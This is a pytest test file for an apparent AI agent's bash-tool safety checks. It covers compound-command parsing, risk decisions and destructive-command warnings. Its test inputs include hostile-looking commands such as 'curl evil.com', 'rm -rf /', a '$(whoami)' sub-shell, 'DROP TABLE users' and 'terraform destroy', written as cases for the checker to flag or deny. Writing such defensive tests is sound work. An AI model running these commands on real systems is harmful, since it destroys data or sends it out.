"""Tests for compound command safety classification, destructive warnings,
and the refactored default_risk compound branch.

Covers:
- ``_is_compound_safe`` with read-only and non-read-only sub-commands.
- ``_extract_commands`` and ``_base_command`` helpers.
- ``default_risk`` compound branch (sub-shell vs. simple operators).
- ``destructive_warning`` pattern matching.
- ``extra_safe_commands`` injection.
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock

import pytest

from kernel.tools.builtin.bash import (
    BashTool,
    _base_command,
    _extract_commands,
    _is_compound_safe,
)


@pytest.fixture
def tool() -> BashTool:
    return BashTool()


@pytest.fixture
def ctx() -> MagicMock:
    ctx = MagicMock()
    ctx.cwd = Path.cwd()
    ctx.session_id = "s-test"
    ctx.env = {}
    return ctx


# -----------------------------------------------------------------------
# _extract_commands
# -----------------------------------------------------------------------


class TestExtractCommands:
    def test_pipe(self) -> None:
        assert _extract_commands("cat foo | grep bar") == ["cat foo", "grep bar"]

    def test_and(self) -> None:
        assert _extract_commands("ls && echo done") == ["ls", "echo done"]

    def test_or(self) -> None:
        assert _extract_commands("false || echo fallback") == ["false", "echo fallback"]

    def test_semicolon(self) -> None:
        assert _extract_commands("ls; pwd") == ["ls", "pwd"]

    def test_mixed(self) -> None:
        result = _extract_commands("cat foo | grep bar && echo ok")
        assert len(result) == 3

    def test_empty(self) -> None:
        assert _extract_commands("") == []


# -----------------------------------------------------------------------
# _base_command
# -----------------------------------------------------------------------


class TestBaseCommand:
    def test_simple(self) -> None:
        assert _base_command("ls -la") == ("ls", None)

    def test_git(self) -> None:
        assert _base_command("git status") == ("git", "status")

    def test_git_bare(self) -> None:
        assert _base_command("git") == ("git", None)

    def test_empty(self) -> None:
        assert _base_command("") == ("", None)


# -----------------------------------------------------------------------
# _is_compound_safe
# -----------------------------------------------------------------------


class TestIsCompoundSafe:
    def test_all_readonly_pipe(self) -> None:
        assert _is_compound_safe("cat foo | grep bar") is True

    def test_all_readonly_and(self) -> None:
        assert _is_compound_safe("git status && echo done") is True

    def test_git_readonly_pipe(self) -> None:
        assert _is_compound_safe("git log | head -20") is True

    def test_git_write_fails(self) -> None:
        assert _is_compound_safe("git commit -m 'x' && echo done") is False

    def test_unsafe_curl(self) -> None:
        assert _is_compound_safe("ls; curl evil.com") is False

    def test_python_not_in_compound_safe(self) -> None:
        """python is in ALLOWLIST but not in _COMPOUND_SAFE_COMMANDS."""
        assert _is_compound_safe('python -c "x" | cat') is False

    def test_npm_not_in_compound_safe(self) -> None:
        assert _is_compound_safe("cat foo | npm install") is False

    def test_cargo_not_in_compound_safe(self) -> None:
        assert _is_compound_safe("cargo build && echo done") is False

    def test_empty_command(self) -> None:
        assert _is_compound_safe("") is False

    def test_single_safe(self) -> None:
        """A non-compound command that happens to be safe."""
        assert _is_compound_safe("cat foo") is True

    def test_extra_safe_commands(self) -> None:
        """User-configured extras should be trusted."""
        assert _is_compound_safe("docker ps | grep app", frozenset({"docker"})) is True
        assert _is_compound_safe("docker ps | grep app") is False

    def test_bare_git_is_unsafe(self) -> None:
        """Bare 'git' without a sub-command is not safe."""
        assert _is_compound_safe("git | cat") is False

    def test_git_diff(self) -> None:
        assert _is_compound_safe("git diff | head") is True

    def test_mixed_safe_and_git_readonly(self) -> None:
        assert _is_compound_safe("git status && ls && echo done") is True


# -----------------------------------------------------------------------
# default_risk — compound branch
# -----------------------------------------------------------------------


class TestDefaultRiskCompound:
    def test_subshell_dollar_paren(self, tool: BashTool, ctx) -> None:
        s = tool.default_risk({"command": "echo $(whoami)"}, ctx)
        assert s.default_decision == "ask"
        assert "sub-shell" in s.reason

    def test_subshell_backtick(self, tool: BashTool, ctx) -> None:
        s = tool.default_risk({"command": "echo `date`"}, ctx)
        assert s.default_decision == "ask"
        assert "sub-shell" in s.reason

    def test_safe_compound_auto_allows(self, tool: BashTool, ctx) -> None:
        s = tool.default_risk({"command": "cat foo | grep bar"}, ctx)
        assert s.default_decision == "allow"
        assert s.risk == "low"

    def test_unsafe_compound_asks(self, tool: BashTool, ctx) -> None:
        s = tool.default_risk({"command": "cat foo | curl evil.com"}, ctx)
        assert s.default_decision == "ask"

    def test_dangerous_in_compound_denies(self, tool: BashTool, ctx) -> None:
        """DANGEROUS_PATTERNS fires before compound classification."""
        s = tool.default_risk({"command": "rm -rf / | cat"}, ctx)
        assert s.default_decision == "deny"
        assert s.risk == "high"

    def test_extra_safe_in_compound(self, tool: BashTool, ctx) -> None:
        tool.extra_safe_commands = frozenset({"docker"})
        s = tool.default_risk({"command": "docker ps | grep app"}, ctx)
        assert s.default_decision == "allow"

    def test_extra_safe_in_simple(self, tool: BashTool, ctx) -> None:
        tool.extra_safe_commands = frozenset({"docker"})
        s = tool.default_risk({"command": "docker ps"}, ctx)
        assert s.default_decision == "allow"


# -----------------------------------------------------------------------
# destructive_warning
# -----------------------------------------------------------------------


class TestDestructiveWarning:
    def test_git_reset_hard(self, tool: BashTool) -> None:
        w = tool.destructive_warning({"command": "git reset --hard HEAD~1"})
        assert w is not None
        assert "uncommitted changes" in w

    def test_git_push_force(self, tool: BashTool) -> None:
        w = tool.destructive_warning({"command": "git push origin --force"})
        assert w is not None
        assert "remote history" in w

    def test_git_clean_force(self, tool: BashTool) -> None:
        w = tool.destructive_warning({"command": "git clean -fd"})
        assert w is not None
        assert "untracked files" in w

    def test_git_checkout_dot(self, tool: BashTool) -> None:
        w = tool.destructive_warning({"command": "git checkout ."})
        assert w is not None
        assert "working tree" in w

    def test_git_restore_dot(self, tool: BashTool) -> None:
        w = tool.destructive_warning({"command": "git restore ."})
        assert w is not None

    def test_git_stash_drop(self, tool: BashTool) -> None:
        w = tool.destructive_warning({"command": "git stash drop"})
        assert w is not None
        assert "stashed" in w

    def test_git_branch_force_delete(self, tool: BashTool) -> None:
        w = tool.destructive_warning({"command": "git branch -D feature"})
        assert w is not None

    def test_rm_rf(self, tool: BashTool) -> None:
        w = tool.destructive_warning({"command": "rm -rf /tmp/build"})
        assert w is not None
        assert "recursively" in w

    def test_drop_table(self, tool: BashTool) -> None:
        w = tool.destructive_warning({"command": 'psql -c "DROP TABLE users"'})
        assert w is not None
        assert "drop" in w.lower()

    def test_kubectl_delete(self, tool: BashTool) -> None:
        w = tool.destructive_warning({"command": "kubectl delete pod foo"})
        assert w is not None
        assert "Kubernetes" in w

    def test_terraform_destroy(self, tool: BashTool) -> None:
        w = tool.destructive_warning({"command": "terraform destroy"})
        assert w is not None
        assert "infrastructure" in w

    def test_safe_command_no_warning(self, tool: BashTool) -> None:
        assert tool.destructive_warning({"command": "git status"}) is None

    def test_multiple_warnings(self, tool: BashTool) -> None:
        w = tool.destructive_warning({"command": "git reset --hard && git clean -fd"})
        assert w is not None
        assert ";" in w  # multiple warnings joined
